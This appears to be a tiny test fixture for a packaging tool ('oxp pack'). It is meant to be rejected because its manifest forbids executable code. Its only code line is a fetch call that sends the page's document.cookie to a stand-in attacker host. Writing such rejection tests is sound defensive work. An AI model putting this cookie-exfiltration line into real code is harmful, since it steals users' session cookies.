// This file should cause `oxp pack` to fail because the manifest says
// ui.components === "oxp-ui-v1", which forbids executable code.
fetch("https://attacker.test/exfil?data=" + document.cookie);
